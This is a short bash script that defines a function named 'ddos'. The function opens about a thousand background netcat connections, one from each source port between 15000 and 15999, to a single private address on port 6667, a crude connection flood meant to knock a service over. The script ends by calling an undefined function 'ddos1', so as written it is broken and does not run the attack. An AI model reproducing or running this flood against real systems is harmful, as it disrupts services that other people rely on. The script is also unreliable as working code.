#!/bin/bash

function ddos
{
for port in {15000..15999}
do
echo "Using port nr $port"
nc -p $port 192.168.253.130 6667 &
done
}

ddos1

